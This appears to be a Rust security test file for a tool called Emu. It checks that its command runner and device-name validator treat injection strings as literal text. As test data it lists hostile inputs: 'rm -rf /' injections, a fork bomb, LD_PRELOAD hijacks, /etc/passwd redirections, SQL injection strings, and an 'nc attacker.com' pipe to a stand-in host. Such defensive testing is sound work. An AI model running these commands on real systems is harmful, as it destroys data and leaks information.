//! Advanced security tests for Emu
//!
//! This module contains comprehensive security tests focusing on command injection,
//! path traversal, and input validation vulnerabilities. These tests extend the
//! basic security coverage to ensure robust protection against sophisticated attacks.

use emu::utils::command::CommandRunner;
use emu::utils::validation::{
    DeviceNameValidator, DevicePlatform, FieldValidator, NumericRangeValidator,
};

/// Test advanced command injection patterns including multi-stage attacks
#[tokio::test]
async fn test_advanced_command_injection_patterns() {
    let runner = CommandRunner::new();

    // Advanced injection patterns that might bypass simple filters
    let advanced_patterns = vec![
        // Multi-stage injection attempts
        "device$(echo ';rm -rf /tmp')",
        "device`echo ';rm -rf /tmp'`",
        "device${IFS}&&${IFS}malicious_command",
        // Using environment variables
        "device$PATH",
        "device${PATH}",
        "device$((1+1))",
        // Nested command substitution
        "device$(echo $(whoami))",
        r"device`echo \`whoami\``",
        // Unicode and encoding tricks
        "device\u{003B}malicious_command", // Unicode semicolon
        "device%3Bmalicious_command",      // URL encoded semicolon
        "device\x3Bmalicious_command",     // Hex encoded semicolon
        // Null byte injection
        "device\0malicious_command",
        "device%00malicious_command",
        // CRLF injection
        "device\r\nmalicious_command",
        "device%0D%0Amalicious_command",
        // Tab and space tricks
        "device\tmalicious_command",
        "device\x09malicious_command",
        "device${IFS}malicious_command",
        // Escape sequence tricks
        "device\\;malicious_command",
        "device\\|\\|malicious_command",
        "device\\&&malicious_command",
    ];

    for pattern in advanced_patterns {
        let result = runner.run("echo", &[pattern]).await;

        match result {
            Ok(output) => {
                // Should treat the entire pattern as a literal string
                assert!(!output.contains("command not found"));
                assert!(!output.contains("Permission denied"));
                // The pattern should appear in output (possibly escaped)
            }
            Err(_) => {
                // Clean failure is acceptable and preferred for dangerous patterns
            }
        }
    }
}

/// Test command injection in different argument positions
#[tokio::test]
async fn test_positional_command_injection() {
    let runner = CommandRunner::new();

    let malicious = "; malicious_command";

    // Test injection in different positions
    let test_cases = vec![
        vec![malicious, "safe_arg"],             // First position
        vec!["safe_arg", malicious],             // Second position
        vec!["safe_arg", malicious, "safe_arg"], // Middle position
        vec!["safe", malicious, malicious],      // Multiple malicious args
    ];

    for args in test_cases {
        let result = runner.run("echo", &args).await;

        match result {
            Ok(output) => {
                // Should contain all arguments as literals
                for arg in &args {
                    assert!(output.contains(arg) || output.contains(&arg.replace(';', "\\;")));
                }
            }
            Err(_) => {
                // Clean failure is acceptable
            }
        }
    }
}

/// Test binary data and non-UTF8 sequences
#[tokio::test]
async fn test_binary_data_injection() {
    let runner = CommandRunner::new();

    // Create byte sequences that might cause issues
    let binary_patterns: Vec<Vec<u8>> = vec![
        vec![0xFF, 0xFE, 0xFD],       // Invalid UTF-8
        vec![0x00, 0x01, 0x02],       // Null bytes
        vec![0x1B, 0x5B, 0x32, 0x4A], // ANSI escape sequences
        vec![0x7F],                   // DEL character
        vec![0x08, 0x08, 0x08],       // Backspace characters
    ];

    for pattern in binary_patterns {
        // Convert to lossy UTF-8 for testing
        let arg = String::from_utf8_lossy(&pattern);
        let result = runner.run("echo", &[arg.as_ref()]).await;

        // Binary data should be handled safely without crashes
        match result {
            Ok(_) => {
                // Success means the binary data was handled safely
            }
            Err(_) => {
                // Failure is also acceptable for invalid data
            }
        }
    }
}

/// Test extremely long argument combinations
#[tokio::test]
async fn test_argument_length_limits() {
    let runner = CommandRunner::new();

    // Test various lengths that might cause buffer issues
    let lengths = vec![
        1024,   // 1 KB
        4096,   // 4 KB
        16384,  // 16 KB
        65536,  // 64 KB
        131072, // 128 KB (might exceed system limits)
    ];

    for length in lengths {
        let long_arg = "A".repeat(length);
        let result = runner.run("echo", &[&long_arg]).await;

        // Should either succeed or fail cleanly based on system limits
        match result {
            Ok(output) => {
                // Verify the argument was processed
                assert!(!output.is_empty());
            }
            Err(e) => {
                // Should be a clean error, not a crash
                let error_msg = e.to_string();
                // In CI environment, the error might be different so we're more lenient
                if std::env::var("CI").is_ok() {
                    // In CI, just check that we got an error (any error is acceptable)
                    assert!(
                        !error_msg.is_empty(),
                        "Expected error message but got empty string"
                    );
                } else {
                    assert!(
                        error_msg.contains("too long")
                            || error_msg.contains("limit")
                            || error_msg.contains("E2BIG") // Argument list too long
                    );
                }
            }
        }
    }
}

/// Test device name validation against sophisticated injection attempts
#[test]
fn test_device_name_validation_advanced() {
    let validator = DeviceNameValidator::new(DevicePlatform::Android);

    // Advanced malicious device names
    let long_string = "a".repeat(256);
    let malicious_names = vec![
        // Command substitution variants
        "device$(id)",
        "device`id`",
        "device${USER}",
        // Path injection
        "../../../device",
        "..\\..\\..\\device",
        "/etc/passwd",
        "C:\\Windows\\System32",
        // Special characters that might break parsing
        "device\0null",
        "device\nnewline",
        "device\rcarriage",
        "device\ttab",
        // Unicode tricks
        "device\u{202E}reversed", // Right-to-left override
        "device\u{FEFF}bom",      // Byte order mark
        "device\u{200B}zero",     // Zero-width space
        // Length edge cases
        "",                    // Empty
        " ",                   // Single space
        &long_string.as_str(), // Very long
        // SQL injection patterns (in case names are used in queries)
        "device'; DROP TABLE--",
        "device\" OR \"1\"=\"1",
        "device/*comment*/name",
    ];

    for name in malicious_names {
        let result = validator.validate(name);

        // Most of these should be rejected
        if result.is_ok() {
            // If accepted, must be safe characters only
            assert!(!name.contains(';'));
            assert!(!name.contains('$'));
            assert!(!name.contains('`'));
            assert!(!name.contains(".."));
            assert!(!name.contains('\0'));
            assert!(!name.contains('\n'));
            assert!(!name.contains('\r'));
            assert!(!name.contains(' ')); // No spaces allowed
        }
    }
}

/// Test concurrent command execution for race conditions
#[tokio::test]
async fn test_concurrent_execution_safety() {
    // Launch multiple commands concurrently to test for race conditions
    let mut handles = vec![];

    for i in 0..10 {
        let runner_clone = CommandRunner::new();
        let handle = tokio::spawn(async move {
            let arg = format!("test{i}; echo injected");
            runner_clone.run("echo", &[&arg]).await
        });
        handles.push(handle);
    }

    // Wait for all to complete
    for handle in handles {
        let result = handle.await.unwrap();
        match result {
            Ok(output) => {
                // Should not contain "injected" as a separate command output
                assert!(!output.lines().any(|line| line.trim() == "injected"));
            }
            Err(_) => {
                // Clean failure is acceptable
            }
        }
    }
}

/// Test environment variable injection and manipulation
#[tokio::test]
async fn test_environment_variable_injection() {
    let runner = CommandRunner::new();

    // Test patterns that might manipulate environment
    let env_patterns = vec![
        "LD_PRELOAD=/evil/lib.so",
        "PATH=/evil/bin:$PATH",
        "IFS=;",
        "PS1=$(malicious)",
        "PROMPT_COMMAND=malicious",
    ];

    for pattern in env_patterns {
        // These should be treated as literal arguments, not env manipulation
        let result = runner.run("echo", &[pattern]).await;

        match result {
            Ok(output) => {
                assert!(output.contains(pattern));
            }
            Err(_) => {
                // Clean failure is acceptable
            }
        }
    }
}

/// Test command execution timeout and resource exhaustion
#[tokio::test]
async fn test_resource_exhaustion_protection() {
    let runner = CommandRunner::new();

    // Patterns that might cause resource exhaustion
    let exhaustion_patterns = vec![
        ":(){ :|:& };:",               // Fork bomb
        "yes | head -n 1000000",       // Large output
        "cat /dev/zero",               // Infinite data
        "while true; do echo x; done", // Infinite loop
    ];

    for pattern in exhaustion_patterns {
        let result = runner.run("echo", &[pattern]).await;

        // Should treat as literal string, not execute
        match result {
            Ok(output) => {
                assert!(output.contains(pattern) || output.contains(&pattern.replace('|', "\\|")));
            }
            Err(_) => {
                // Clean failure is acceptable
            }
        }
    }
}

/// Test file descriptor and I/O redirection attacks
#[tokio::test]
async fn test_io_redirection_attacks() {
    let runner = CommandRunner::new();

    let io_patterns = vec![
        "> /etc/passwd",
        ">> /etc/passwd",
        "< /etc/passwd",
        "2>&1",
        "&> /dev/null",
        "| tee /etc/passwd",
        "> /dev/stdout",
        ">&2",
    ];

    for pattern in io_patterns {
        let result = runner.run("echo", &[pattern]).await;

        match result {
            Ok(output) => {
                // Should contain the pattern as literal text
                assert!(output.contains(pattern) || output.contains(&pattern.replace('>', "\\>")));
            }
            Err(_) => {
                // Clean failure is acceptable
            }
        }
    }
}

/// Test complex validation scenarios
#[test]
fn test_complex_validation_scenarios() {
    let storage_validator = NumericRangeValidator::storage_size();

    // Test storage size validation edge cases
    let storage_tests = vec![
        ("0", false),         // Too small
        ("-1", false),        // Negative
        ("999999999", false), // Too large
        ("1.5", false),       // Decimal
        ("1GB", false),       // With unit
        ("1024", true),       // Valid
        ("8192", true),       // Valid
        ("", true),           // Empty is allowed (uses default)
        ("abc", false),       // Non-numeric
        ("1e10", false),      // Scientific notation
        ("0x1000", false),    // Hex
        ("1_000", false),     // With separator
    ];

    for (input, should_pass) in storage_tests {
        let result = storage_validator.validate(input);
        assert_eq!(
            result.is_ok(),
            should_pass,
            "Storage validation failed for: {input}"
        );
    }
}

/// Test command chaining and pipe attacks
#[tokio::test]
async fn test_command_chaining_attacks() {
    let runner = CommandRunner::new();

    let chaining_patterns = vec![
        "cmd1 && cmd2",
        "cmd1 || cmd2",
        "cmd1 ; cmd2",
        "cmd1 | cmd2",
        "cmd1 & cmd2",
        "cmd1; cmd2; cmd3",
        "cmd1 | cmd2 | cmd3",
        "(cmd1; cmd2)",
        "{cmd1; cmd2;}",
        "cmd1 `cmd2`",
        "cmd1 $(cmd2)",
    ];

    for pattern in chaining_patterns {
        let result = runner.run("echo", &[pattern]).await;

        match result {
            Ok(output) => {
                // Should treat entire pattern as single argument
                let lines: Vec<&str> = output.lines().collect();
                assert_eq!(lines.len(), 1, "Command chaining detected for: {pattern}");
            }
            Err(_) => {
                // Clean failure is acceptable
            }
        }
    }
}

/// Test handling of special file paths
#[tokio::test]
async fn test_special_file_paths() {
    let runner = CommandRunner::new();

    let special_paths = vec![
        "/dev/null",
        "/dev/zero",
        "/dev/random",
        "/dev/stdin",
        "/dev/stdout",
        "/dev/stderr",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/sys/class/net/eth0/address",
        "CON",  // Windows special
        "PRN",  // Windows special
        "AUX",  // Windows special
        "NUL",  // Windows special
        "COM1", // Windows special
        "LPT1", // Windows special
    ];

    for path in special_paths {
        // Test with a command that might interact with special files
        let result = runner.run("echo", &[path]).await;

        match result {
            Ok(output) => {
                // Should treat as literal string
                assert!(output.contains(path));
            }
            Err(_) => {
                // Clean failure is acceptable
            }
        }
    }
}

/// Integration test for comprehensive security validation
#[tokio::test]
async fn test_security_integration_comprehensive() {
    let runner = CommandRunner::new();

    // Create a complex scenario combining multiple attack vectors
    let long_string = "A".repeat(1000);
    let complex_scenario = vec![
        "normal_device",
        "device; rm -rf /",
        "../../../etc/passwd",
        "device$(whoami)",
        "device\0null",
        "device|nc attacker.com 1234",
        "device && shutdown",
        "device > /etc/passwd",
        "",
        "   ",
        &long_string.as_str(),
    ];

    // Execute all at once
    let result = runner.run("echo", &complex_scenario).await;

    match result {
        Ok(output) => {
            // Verify no command execution occurred
            assert!(!output.contains("Permission denied"));
            assert!(!output.contains("command not found"));
            assert!(!output.contains("shutdown"));
            assert!(!output.contains("attacker.com"));

            // All args should be treated as literals
            let line_count = output.lines().count();
            assert_eq!(line_count, 1, "Multiple commands executed");
        }
        Err(_) => {
            // Clean failure for complex input is acceptable
        }
    }
}

/// Test security in error scenarios
#[tokio::test]
async fn test_security_in_error_conditions() {
    let runner = CommandRunner::new();

    // Test with non-existent command but malicious arguments
    let result = runner
        .run("nonexistent_command_12345", &["; echo hacked"])
        .await;

    match result {
        Err(e) => {
            let error_msg = e.to_string();
            // Error should be about command not found, not about "hacked"
            assert!(
                error_msg.contains("not found")
                    || error_msg.contains("No such")
                    || error_msg.contains("Failed to execute")
                    || error_msg.contains("cannot find")
                    || error_msg.contains("entity not found"),
                "Unexpected error message: {error_msg}"
            );
            assert!(!error_msg.contains("hacked"));
        }
        Ok(_) => {
            panic!("Expected error for non-existent command");
        }
    }
}

/// Test platform-specific security concerns
#[tokio::test]
async fn test_platform_specific_security() {
    let runner = CommandRunner::new();

    #[cfg(target_os = "windows")]
    let platform_patterns = vec![
        "%COMSPEC%",
        "%SystemRoot%\\system32\\cmd.exe",
        "powershell.exe -Command",
        ".\\malicious.bat",
        "\\\\attacker\\share",
    ];

    #[cfg(not(target_os = "windows"))]
    let platform_patterns = vec![
        "$SHELL",
        "/bin/sh -c",
        "./malicious.sh",
        "bash -c",
        "python -c",
    ];

    for pattern in platform_patterns {
        let result = runner.run("echo", &[pattern]).await;

        match result {
            Ok(output) => {
                // Should be treated as literal
                assert!(output.contains(pattern) || output.contains(&pattern.replace('$', "\\$")));
            }
            Err(_) => {
                // Clean failure is acceptable
            }
        }
    }
}
